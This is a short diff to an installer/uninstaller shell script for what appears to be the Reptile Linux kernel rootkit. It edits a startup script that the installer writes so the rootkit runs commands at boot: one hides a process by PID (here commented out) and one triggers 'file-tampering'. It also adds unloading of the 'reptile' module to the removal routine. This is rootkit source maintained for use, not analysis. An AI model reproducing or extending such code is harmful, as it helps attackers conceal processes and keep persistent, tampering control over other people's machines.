@@ -179,7 +179,7 @@ EOF
 	fi
 
 	cat >> scripts/start <<EOF
-$CMD hide \`ps -ef | grep "ata/0" | grep -v grep | awk '{print \$2}'\`
+#$CMD hide \`ps -ef | grep "ata/0" | grep -v grep | awk '{print \$2}'\`
 $CMD file-tampering
 #</$TAG>
 EOF
@@ -315,6 +315,8 @@ function reptile_remove {
 		/$MODULE/$MODULE"_cmd" show > /dev/null 2>&1 || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
 	fi
 
+	rmmod reptile &
+
 	rm -rf /$MODULE && \
 	rm -rf $DRIVER_DIRECTORY && \
 	echo -e "\e[01;36mDONE!\e[00m\n" || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
@@ -322,7 +324,7 @@ function reptile_remove {
 	directory_remove
 	echo
 
-	read -p "To complete this uninstallation is needed to reboot (Y/N) [default: N]: "
+	read -p "Reboot? (Y/N) [default: N]: "
 	if [ "$REPLY" == "Y" ] || [ "$REPLY" == "y" ]; then
         echo -e "Rebooting... "
         reboot
